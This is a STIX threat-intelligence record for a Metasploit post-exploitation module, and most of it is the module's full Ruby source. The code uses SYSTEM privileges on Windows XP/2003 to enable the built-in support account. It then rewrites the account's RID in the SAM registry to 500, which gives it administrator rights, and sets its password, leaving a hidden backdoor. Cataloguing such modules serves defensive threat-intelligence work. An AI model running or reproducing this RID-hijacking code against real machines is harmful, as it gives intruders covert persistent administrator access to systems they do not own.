{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9d8f68a0-f0a1-4700-9a16-9d24dfb9572a",
    "created": "2024-08-14T16:33:04.999815Z",
    "modified": "2024-08-14T16:33:04.999819Z",
    "name": "Windows Manage Trojanize Support Account",
    "description": " This module enables alternative access to servers and workstations by modifying the support account's properties. It will enable the account for remote access as the administrator user while taking advantage of some weird behavior in lusrmgr.msc. It will check if sufficient privileges are available for registry operations otherwise it exits.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/enable_support_account.rb",
            "external_id": "enable_support_account.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Trojanize Support Account',\n        'Description' => %q{\n          This module enables alternative access to servers and workstations\n          by modifying the support account's properties. It will enable\n          the account for remote access as the administrator user while\n          taking advantage of some weird behavior in lusrmgr.msc. It will\n          check if sufficient privileges are available for registry operations,\n          otherwise it exits.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => 'salcho <salchoman[at]gmail.com>',\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'References'\t=> [ 'http://xangosec.blogspot.com/2013/06/trojanizing-windows.html' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              priv_elevate_getsystem\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('PASSWORD', [true, 'Password of the support user account', 'password']),\n        OptBool.new('GETSYSTEM', [true, 'Attempt to get SYSTEM privilege on the target host.', false])\n      ]\n    )\n  end\n\n  def run\n    reg_key = 'HKLM\\\\SAM\\\\SAM\\\\Domains\\\\Account\\\\Users'\n\n    unless is_system?\n      if datastore['GETSYSTEM']\n        print_status('Trying to get system...')\n        res = session.priv.getsystem\n        if res[0]\n          print_good('Got system!')\n        else\n          print_error('Unable to get system! You need to run this script.')\n          return\n        end\n      else\n        print_error('You need to run this script as system!')\n        return\n      end\n    end\n\n    version = get_version_info\n    unless version.build_number.between?(Msf::WindowsVersion::XP_SP0, Msf::WindowsVersion::Server2003_SP2)\n      print_error(\"#{version.product_name} is not supported\")\n      return\n    end\n\n    print_status(\"Target OS is #{version.product_name}\")\n    names_key = registry_enumkeys(reg_key + '\\\\Names')\n    unless names_key\n      print_error(\"Couldn't access registry keys\")\n      return\n    end\n\n    rid = -1\n    print_status('Harvesting users...')\n    names_key.each do |name|\n      next unless name.include? 'SUPPORT_388945a0'\n\n      print_good(\"Found #{name} account!\")\n      skey = registry_getvalinfo(reg_key + \"\\\\Names\\\\#{name}\", '')\n      if !skey\n        print_error(\"Couldn't open user's key\")\n        return\n      end\n      rid = skey['Type']\n      print_status(\"Target RID is #{rid}\")\n    end\n\n    if rid == -1\n      print_error(\"Couldn't get user's RID...\")\n      return\n    end\n\n    users_key = registry_enumkeys(reg_key)\n    users_key.each do |r|\n      next if r.to_i(16) != rid\n\n      f = registry_getvaldata(reg_key + \"\\\\#{r}\", 'F')\n      if check_active(f)\n        print_status('Account is disabled, activating...')\n        f[0x38] = ['10'].pack('H')\n      else\n        print_error('Target account is already enabled')\n      end\n\n      print_status('Swapping RIDs...!')\n      # Overwrite RID to 500 (as administrator)\n      f = swap_rid(f, 500)\n\n      open_key = registry_setvaldata(reg_key + \"\\\\#{r}\", 'F', f, 'REG_BINARY')\n      unless open_key\n        print_error(\"Can't write to registry... Something's wrong!\")\n        return\n      end\n\n      print_status(\"Setting password to #{datastore['PASSWORD']}\")\n      cmd = cmd_exec('cmd.exe', \"/c net user support_388945a0 #{datastore['PASSWORD']}\")\n      vprint_status(cmd.to_s)\n    end\n  end\n\n  def check_active(f)\n    if f[0x38].unpack('H*')[0].to_i == 11\n      return true\n    else\n      return false\n    end\n  end\n\n  def swap_rid(f, rid)\n    # This function will set hex format to a given RID integer\n    hex = [('%04x' % rid).scan(/.{2}/).reverse.join].pack('H*')\n    # Overwrite new RID at offset 0x30\n    f[0x30, 2] = hex\n    return f\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}